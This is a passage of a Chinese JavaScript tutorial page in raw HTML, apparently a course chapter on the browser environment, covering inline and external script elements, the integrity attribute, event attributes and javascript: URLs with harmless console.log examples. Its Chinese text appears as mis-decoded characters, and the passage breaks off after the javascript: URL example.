class="vp-sidebar-sub-headers"></ul><!--]--></li></ul></section></li></ul><!--[--><!----><!--]--></aside><!--[--><main id="main-content" class="vp-page"><!--[--><!----><!----><nav class="vp-breadcrumb disable"></nav><div class="vp-page-title"><h1><span class="font-icon icon iconfont icon-js" style=""></span>23.BOM</h1><div class="page-info"><span class="page-author-info" aria-label="ä½œè€…ğŸ–Š" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon author-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="author icon"><path d="M649.6 633.6c86.4-48 147.2-144 147.2-249.6 0-160-128-288-288-288s-288 128-288 288c0 108.8 57.6 201.6 147.2 249.6-121.6 48-214.4 153.6-240 288-3.2 9.6 0 19.2 6.4 25.6 3.2 9.6 12.8 12.8 22.4 12.8h704c9.6 0 19.2-3.2 25.6-12.8 6.4-6.4 9.6-16 6.4-25.6-25.6-134.4-121.6-240-243.2-288z"></path></svg><span><a class="page-author-item" href="https://harryxiong24.github.io" target="_blank" rel="noopener noreferrer">Harry Xiong</a></span><span property="author" content="Harry Xiong"></span></span><!----><span class="page-date-info" aria-label="å†™ä½œæ—¥æœŸğŸ“…" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon calendar-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="calendar icon"><path d="M716.4 110.137c0-18.753-14.72-33.473-33.472-33.473-18.753 0-33.473 14.72-33.473 33.473v33.473h66.993v-33.473zm-334.87 0c0-18.753-14.72-33.473-33.473-33.473s-33.52 14.72-33.52 33.473v33.473h66.993v-33.473zm468.81 33.52H716.4v100.465c0 18.753-14.72 33.473-33.472 33.473a33.145 33.145 0 01-33.473-33.473V143.657H381.53v100.465c0 18.753-14.72 33.473-33.473 33.473a33.145 33.145 0 01-33.473-33.473V143.657H180.6A134.314 134.314 0 0046.66 277.595v535.756A134.314 134.314 0 00180.6 947.289h669.74a134.36 134.36 0 00133.94-133.938V277.595a134.314 134.314 0 00-133.94-133.938zm33.473 267.877H147.126a33.145 33.145 0 01-33.473-33.473c0-18.752 14.72-33.473 33.473-33.473h736.687c18.752 0 33.472 14.72 33.472 33.473a33.145 33.145 0 01-33.472 33.473z"></path></svg><span><!----></span><meta property="datePublished" content="2021-08-01T00:00:00.000Z"></span><span class="page-pageview-info" aria-label="è®¿é—®é‡ğŸ”¢" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon eye-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="eye icon"><path d="M992 512.096c0-5.76-.992-10.592-1.28-11.136-.192-2.88-1.152-8.064-2.08-10.816-.256-.672-.544-1.376-.832-2.08-.48-1.568-1.024-3.104-1.6-4.32C897.664 290.112 707.104 160 512 160c-195.072 0-385.632 130.016-473.76 322.592-1.056 2.112-1.792 4.096-2.272 5.856a55.512 55.512 0 00-.64 1.6c-1.76 5.088-1.792 8.64-1.632 7.744-.832 3.744-1.568 11.168-1.568 11.168-.224 2.272-.224 4.032.032 6.304 0 0 .736 6.464 1.088 7.808.128 1.824.576 4.512 1.12 6.976h-.032c.448 2.08 1.12 4.096 1.984 6.08.48 1.536.992 2.976 1.472 4.032C126.432 733.856 316.992 864 512 864c195.136 0 385.696-130.048 473.216-321.696 1.376-2.496 2.24-4.832 2.848-6.912.256-.608.48-1.184.672-1.728 1.536-4.48 1.856-8.32 1.728-8.32l-.032.032c.608-3.104 1.568-7.744 1.568-13.28zM512 672c-88.224 0-160-71.776-160-160s71.776-160 160-160 160 71.776 160 160-71.776 160-160 160z"></path></svg><span id="ArtalkPV" class="waline-pageview-count" data-path="/zh/front-end/advanced-js/jses23.html">...</span></span><span class="page-reading-time-info" aria-label="é˜…è¯»æ—¶é—´âŒ›" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon timer-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="timer icon"><path d="M799.387 122.15c4.402-2.978 7.38-7.897 7.38-13.463v-1.165c0-8.933-7.38-16.312-16.312-16.312H256.33c-8.933 0-16.311 7.38-16.311 16.312v1.165c0 5.825 2.977 10.874 7.637 13.592 4.143 194.44 97.22 354.963 220.201 392.763-122.204 37.542-214.893 196.511-220.2 389.397-4.661 5.049-7.638 11.651-7.638 19.03v5.825h566.49v-5.825c0-7.379-2.849-13.981-7.509-18.9-5.049-193.016-97.867-351.985-220.2-389.527 123.24-37.67 216.446-198.453 220.588-392.892zM531.16 450.445v352.632c117.674 1.553 211.787 40.778 211.787 88.676H304.097c0-48.286 95.149-87.382 213.728-88.676V450.445c-93.077-3.107-167.901-81.297-167.901-177.093 0-8.803 6.99-15.793 15.793-15.793 8.803 0 15.794 6.99 15.794 15.793 0 80.261 63.69 145.635 142.01 145.635s142.011-65.374 142.011-145.635c0-8.803 6.99-15.793 15.794-15.793s15.793 6.99 15.793 15.793c0 95.019-73.789 172.82-165.96 177.093z"></path></svg><span>å¤§çº¦ 69 åˆ†é’Ÿ</span><meta property="timeRequired" content="PT69M"></span><span class="page-category-info" aria-label="åˆ†ç±»ğŸŒˆ" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon category-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="category icon"><path d="M148.41 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H148.41c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.311-40.31zM147.556 553.478H429.73c22.263 0 40.311 18.048 40.311 40.31v282.176c0 22.263-18.048 40.312-40.31 40.312H147.555c-22.263 0-40.311-18.049-40.311-40.312V593.79c0-22.263 18.048-40.311 40.31-40.311zM593.927 106.992h282.176c22.263 0 40.31 18.048 40.31 40.31V429.48c0 22.263-18.047 40.31-40.31 40.31H593.927c-22.263 0-40.311-18.047-40.311-40.31V147.302c0-22.263 18.048-40.31 40.31-40.31zM730.22 920.502H623.926c-40.925 0-74.22-33.388-74.22-74.425V623.992c0-41.038 33.387-74.424 74.425-74.424h222.085c41.038 0 74.424 33.226 74.424 74.067v114.233c0 10.244-8.304 18.548-18.547 18.548s-18.548-8.304-18.548-18.548V623.635c0-20.388-16.746-36.974-37.33-36.974H624.13c-20.585 0-37.331 16.747-37.331 37.33v222.086c0 20.585 16.654 37.331 37.126 37.331H730.22c10.243 0 18.547 8.304 18.547 18.547 0 10.244-8.304 18.547-18.547 18.547z"></path></svg><!--[--><span class="page-category-item category5 clickable" role="navigation">Web å‰ç«¯</span><!--]--><meta property="articleSection" content="Web å‰ç«¯"></span><span class="page-tag-info" aria-label="æ ‡ç­¾ğŸ·" data-balloon-pos="down"><svg xmlns="http://www.w3.org/2000/svg" class="icon tag-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="tag icon"><path d="M939.902 458.563L910.17 144.567c-1.507-16.272-14.465-29.13-30.737-30.737L565.438 84.098h-.402c-3.215 0-5.726 1.005-7.634 2.913l-470.39 470.39a10.004 10.004 0 000 14.164l365.423 365.424c1.909 1.908 4.42 2.913 7.132 2.913s5.223-1.005 7.132-2.913l470.39-470.39c2.01-2.11 3.014-5.023 2.813-8.036zm-240.067-72.121c-35.458 0-64.286-28.828-64.286-64.286s28.828-64.285 64.286-64.285 64.286 28.828 64.286 64.285-28.829 64.286-64.286 64.286z"></path></svg><!--[--><span class="page-tag-item tag0 clickable" role="navigation">JS è¿›é˜¶æ•™ç¨‹</span><!--]--><meta property="keywords" content="JS è¿›é˜¶æ•™ç¨‹"></span></div><hr></div><div class="toc-place-holder"><aside id="toc"><!--[--><!----><!--]--><div class="toc-header">æ­¤é¡µå†…å®¹<button type="button" class="print-button" title="æ‰“å°"><svg xmlns="http://www.w3.org/2000/svg" class="icon print-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="print icon"><path d="M819.2 364.8h-44.8V128c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v236.8h-44.8C145.067 364.8 96 413.867 96 473.6v192c0 59.733 49.067 108.8 108.8 108.8h44.8V896c0 17.067 14.933 32 32 32h460.8c17.067 0 32-14.933 32-32V774.4h44.8c59.733 0 108.8-49.067 108.8-108.8v-192c0-59.733-49.067-108.8-108.8-108.8zM313.6 160h396.8v204.8H313.6V160zm396.8 704H313.6V620.8h396.8V864zM864 665.6c0 25.6-19.2 44.8-44.8 44.8h-44.8V588.8c0-17.067-14.933-32-32-32H281.6c-17.067 0-32 14.933-32 32v121.6h-44.8c-25.6 0-44.8-19.2-44.8-44.8v-192c0-25.6 19.2-44.8 44.8-44.8h614.4c25.6 0 44.8 19.2 44.8 44.8v192z"></path></svg></button></div><div class="toc-wrapper"><ul class="toc-list"><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°" class="router-link-active router-link-exact-active toc-link level2">æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•" class="router-link-active router-link-exact-active toc-link level3">ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#äº‹ä»¶å±æ€§" class="router-link-active router-link-exact-active toc-link level3">äº‹ä»¶å±æ€§</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#url-åè®®" class="router-link-active router-link-exact-active toc-link level3">URL åè®®</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#script-å…ƒç´ " class="router-link-active router-link-exact-active toc-link level3">script å…ƒç´ </a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æµè§ˆå™¨çš„ç»„æˆ" class="router-link-active router-link-exact-active toc-link level3">æµè§ˆå™¨çš„ç»„æˆ</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#window-å¯¹è±¡" class="router-link-active router-link-exact-active toc-link level2">Window å¯¹è±¡</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æ¦‚è¿°" class="router-link-active router-link-exact-active toc-link level3">æ¦‚è¿°</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#window-å¯¹è±¡çš„å±æ€§" class="router-link-active router-link-exact-active toc-link level3">window å¯¹è±¡çš„å±æ€§</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#window-å¯¹è±¡çš„æ–¹æ³•" class="router-link-active router-link-exact-active toc-link level3">window å¯¹è±¡çš„æ–¹æ³•</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#window-getselection" class="router-link-active router-link-exact-active toc-link level3">window.getSelection()</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#äº‹ä»¶" class="router-link-active router-link-exact-active toc-link level3">äº‹ä»¶</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#å¤šçª—å£æ“ä½œ" class="router-link-active router-link-exact-active toc-link level3">å¤šçª—å£æ“ä½œ</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#navigator-å¯¹è±¡ä¸-screen-å¯¹è±¡" class="router-link-active router-link-exact-active toc-link level2">Navigator å¯¹è±¡ä¸ Screen å¯¹è±¡</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#navigator-å¯¹è±¡çš„å±æ€§" class="router-link-active router-link-exact-active toc-link level3">Navigator å¯¹è±¡çš„å±æ€§</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#navigator-å¯¹è±¡çš„æ–¹æ³•" class="router-link-active router-link-exact-active toc-link level3">Navigator å¯¹è±¡çš„æ–¹æ³•</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#navigator-çš„å®éªŒæ€§å±æ€§" class="router-link-active router-link-exact-active toc-link level3">Navigator çš„å®éªŒæ€§å±æ€§</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#screen-å¯¹è±¡" class="router-link-active router-link-exact-active toc-link level3">Screen å¯¹è±¡</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#cookie" class="router-link-active router-link-exact-active toc-link level2">Cookie</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æ¦‚è¿°-1" class="router-link-active router-link-exact-active toc-link level3">æ¦‚è¿°</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#cookie-ä¸-http-åè®®" class="router-link-active router-link-exact-active toc-link level3">Cookie ä¸ HTTP åè®®</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#cookie-çš„å±æ€§" class="router-link-active router-link-exact-active toc-link level3">Cookie çš„å±æ€§</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#document-cookie" class="router-link-active router-link-exact-active toc-link level3">document.cookie</a></li><!----><!--]--></ul></li><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#åŒæºé™åˆ¶" class="router-link-active router-link-exact-active toc-link level2">åŒæºé™åˆ¶</a></li><li><ul class="toc-list"><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#æ¦‚è¿°-2" class="router-link-active router-link-exact-active toc-link level3">æ¦‚è¿°</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#cookie-1" class="router-link-active router-link-exact-active toc-link level3">Cookie</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#iframe-å’Œå¤šçª—å£é€šä¿¡" class="router-link-active router-link-exact-active toc-link level3">iframe å’Œå¤šçª—å£é€šä¿¡</a></li><!----><!--]--><!--[--><li class="toc-item"><a aria-current="page" href="/zh/front-end/advanced-js/jses23.html#ajax" class="router-link-active router-link-exact-active toc-link level3">AJAX</a></li><!----><!--]--></ul></li><!--]--></ul><div class="toc-marker" style="top:-1.7rem;"></div></div><!--[--><!----><!--]--></aside></div><!----><div class="theme-hope-content"><h1 id="bom" tabindex="-1"><a class="header-anchor" href="#bom" aria-hidden="true">#</a> BOM</h1><h2 id="æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°" tabindex="-1"><a class="header-anchor" href="#æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°" aria-hidden="true">#</a> æµè§ˆå™¨ç¯å¢ƒæ¦‚è¿°</h2><h3 id="ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•" tabindex="-1"><a class="header-anchor" href="#ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•" aria-hidden="true">#</a> ä»£ç åµŒå…¥ç½‘é¡µçš„æ–¹æ³•</h3><p>ç½‘é¡µä¸­åµŒå…¥ JavaScript ä»£ç ï¼Œä¸»è¦æœ‰å››ç§æ–¹æ³•ï¼š</p><ul><li><code>&lt;script&gt;</code>å…ƒç´ ç›´æ¥åµŒå…¥ä»£ç ã€‚</li><li><code>&lt;script&gt;</code>æ ‡ç­¾åŠ è½½å¤–éƒ¨è„šæœ¬</li><li>äº‹ä»¶å±æ€§</li><li>URL åè®®</li></ul><h4 id="script-å…ƒç´ åµŒå…¥ä»£ç " tabindex="-1"><a class="header-anchor" href="#script-å…ƒç´ åµŒå…¥ä»£ç " aria-hidden="true">#</a> script å…ƒç´ åµŒå…¥ä»£ç </h4><p><code>&lt;script&gt;</code>å…ƒç´ å†…éƒ¨å¯ä»¥ç›´æ¥å†™å…¥ JavaScript ä»£ç ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><code>&lt;script&gt;</code>æ ‡ç­¾æœ‰ä¸€ä¸ªtypeå±æ€§ï¼Œç”¨æ¥æŒ‡å®šè„šæœ¬ç±»å‹ã€‚å¯¹ JavaScript è„šæœ¬æ¥è¯´ï¼Œtypeå±æ€§å¯ä»¥è®¾ä¸ºä¸¤ç§å€¼ã€‚</p><ul><li><code>text/javascript</code>ï¼šè¿™æ˜¯é»˜è®¤å€¼ï¼Œä¹Ÿæ˜¯å†å²ä¸Šä¸€è´¯è®¾å®šçš„å€¼ã€‚å¦‚æœä½ çœç•¥<code>type</code>å±æ€§ï¼Œé»˜è®¤å°±æ˜¯è¿™ä¸ªå€¼ã€‚å¯¹äºè€å¼æµè§ˆå™¨ï¼Œè®¾ä¸ºè¿™ä¸ªå€¼æ¯”è¾ƒå¥½ã€‚</li><li><code>application/javascript</code>ï¼šå¯¹äºè¾ƒæ–°çš„æµè§ˆå™¨ï¼Œå»ºè®®è®¾ä¸ºè¿™ä¸ªå€¼ã€‚</li></ul><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>application/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;Hello World&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ç”±äº<code>&lt;script&gt;</code>æ ‡ç­¾é»˜è®¤å°±æ˜¯ JavaScript ä»£ç ã€‚æ‰€ä»¥ï¼ŒåµŒå…¥ JavaScript è„šæœ¬æ—¶ï¼Œ<code>type</code>å±æ€§å¯ä»¥çœç•¥ã€‚</p><p>å¦‚æœ<code>type</code>å±æ€§çš„å€¼ï¼Œæµè§ˆå™¨ä¸è®¤è¯†ï¼Œé‚£ä¹ˆå®ƒä¸ä¼šæ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥åœ¨<code>&lt;script&gt;</code>æ ‡ç­¾ä¹‹ä¸­åµŒå…¥ä»»æ„çš„æ–‡æœ¬å†…å®¹ï¼Œåªè¦åŠ ä¸Šä¸€ä¸ªæµè§ˆå™¨ä¸è®¤è¯†çš„<code>type</code>å±æ€§å³å¯ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>mydata<span class="token punctuation">&quot;</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>x-custom-data<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;Hello World&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢çš„ä»£ç ï¼Œæµè§ˆå™¨ä¸ä¼šæ‰§è¡Œï¼Œä¹Ÿä¸ä¼šæ˜¾ç¤ºå®ƒçš„å†…å®¹ï¼Œå› ä¸ºä¸è®¤è¯†å®ƒçš„<code>type</code>å±æ€§ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ª<code>&lt;script&gt;</code>èŠ‚ç‚¹ä¾ç„¶å­˜åœ¨äº DOM ä¹‹ä¸­ï¼Œå¯ä»¥ä½¿ç”¨<code>&lt;script&gt;</code>èŠ‚ç‚¹çš„<code>text</code>å±æ€§è¯»å‡ºå®ƒçš„å†…å®¹ã€‚</p><div class="language-javascript" data-ext="js"><pre class="language-javascript"><code>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;mydata&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
<span class="token comment">//   console.log(&#39;Hello World&#39;);</span>
</code></pre></div><h4 id="script-å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬" tabindex="-1"><a class="header-anchor" href="#script-å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬" aria-hidden="true">#</a> script å…ƒç´ åŠ è½½å¤–éƒ¨è„šæœ¬</h4><p><code>&lt;script&gt;</code>æ ‡ç­¾ä¹Ÿå¯ä»¥æŒ‡å®šåŠ è½½å¤–éƒ¨çš„è„šæœ¬æ–‡ä»¶ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://www.example.com/script.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>å¦‚æœè„šæœ¬æ–‡ä»¶ä½¿ç”¨äº†éè‹±è¯­å­—ç¬¦ï¼Œè¿˜åº”è¯¥æ³¨æ˜å­—ç¬¦çš„ç¼–ç ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://www.example.com/script.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>æ‰€åŠ è½½çš„è„šæœ¬å¿…é¡»æ˜¯çº¯çš„ JavaScript ä»£ç ï¼Œä¸èƒ½æœ‰<code>HTML</code>ä»£ç å’Œ<code>&lt;script&gt;</code>æ ‡ç­¾ã€‚</p><p>åŠ è½½å¤–éƒ¨è„šæœ¬å’Œç›´æ¥æ·»åŠ ä»£ç å—ï¼Œè¿™ä¸¤ç§æ–¹æ³•ä¸èƒ½æ··ç”¨ã€‚ä¸‹é¢ä»£ç çš„<code>console.log</code>è¯­å¥ç›´æ¥è¢«å¿½ç•¥ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>utf-8<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>example.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;Hello World!&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸ºäº†é˜²æ­¢æ”»å‡»è€…ç¯¡æ”¹å¤–éƒ¨è„šæœ¬ï¼Œ<code>script</code>æ ‡ç­¾å…è®¸è®¾ç½®ä¸€ä¸ª<code>integrity</code>å±æ€§ï¼Œå†™å…¥è¯¥å¤–éƒ¨è„šæœ¬çš„ Hash ç­¾åï¼Œç”¨æ¥éªŒè¯è„šæœ¬çš„ä¸€è‡´æ€§ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>/assets/application.js<span class="token punctuation">&quot;</span></span>
  <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sha256-TvVUHzSfftWg1rcfL6TIJ0XKEGrgLyEq6lEpcmrG9qs=<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>script</code>æ ‡ç­¾æœ‰ä¸€ä¸ª<code>integrity</code>å±æ€§ï¼ŒæŒ‡å®šäº†å¤–éƒ¨è„šæœ¬<code>/assets/application.js</code>çš„ SHA256 ç­¾åã€‚ä¸€æ—¦æœ‰äººæ”¹äº†è¿™ä¸ªè„šæœ¬ï¼Œå¯¼è‡´ SHA256 ç­¾åä¸åŒ¹é…ï¼Œæµè§ˆå™¨å°±ä¼šæ‹’ç»åŠ è½½ã€‚</p><h3 id="äº‹ä»¶å±æ€§" tabindex="-1"><a class="header-anchor" href="#äº‹ä»¶å±æ€§" aria-hidden="true">#</a> äº‹ä»¶å±æ€§</h3><p>ç½‘é¡µå…ƒç´ çš„äº‹ä»¶å±æ€§ï¼ˆæ¯”å¦‚<code>onclick</code>å’Œ<code>onmouseover</code>ï¼‰ï¼Œå¯ä»¥å†™å…¥ JavaScript ä»£ç ã€‚å½“æŒ‡å®šäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå°±ä¼šè°ƒç”¨è¿™äº›ä»£ç ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>myBtn<span class="token punctuation">&quot;</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token value javascript language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">)</span></span><span class="token punctuation">&quot;</span></span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>ä¸Šé¢çš„äº‹ä»¶å±æ€§ä»£ç åªæœ‰ä¸€ä¸ªè¯­å¥ã€‚å¦‚æœæœ‰å¤šä¸ªè¯­å¥ï¼Œä½¿ç”¨åˆ†å·åˆ†éš”å³å¯ã€‚</p><h3 id="url-åè®®" tabindex="-1"><a class="header-anchor" href="#url-åè®®" aria-hidden="true">#</a> URL åè®®</h3><p>URL æ”¯æŒ<code>javascript:</code>åè®®ï¼Œå³åœ¨ URL çš„ä½ç½®å†™å…¥ä»£ç ï¼Œä½¿ç”¨è¿™ä¸ª URL çš„æ—¶å€™å°±ä¼šæ‰§è¡Œ JavaScript ä»£ç ã€‚</p><div class="language-html" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript:console.log(&#39;Hello&#39;)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>ç‚¹å‡»<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
